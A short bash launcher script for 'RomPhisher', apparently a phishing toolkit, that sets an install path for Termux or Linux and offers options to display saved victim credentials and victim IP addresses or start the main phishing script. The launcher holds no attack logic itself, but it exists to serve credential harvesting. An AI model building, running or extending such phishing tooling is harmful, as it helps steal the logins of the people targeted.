#!/bin/bash

# https://github.com/qyroxr/Rom-Phiser.git

if [[ $(uname -o) == *'Android'* ]];then
	ROMPHISHER_ROOT="/data/data/com.termux/files/usr/opt/romphisher"
else
	export ROMPHISHER_ROOT="/opt/romphisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run RomPhisher type \`romphisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $ROMPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $ROMPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $ROMPHISHER_ROOT
	bash ./romphisher.sh
fi
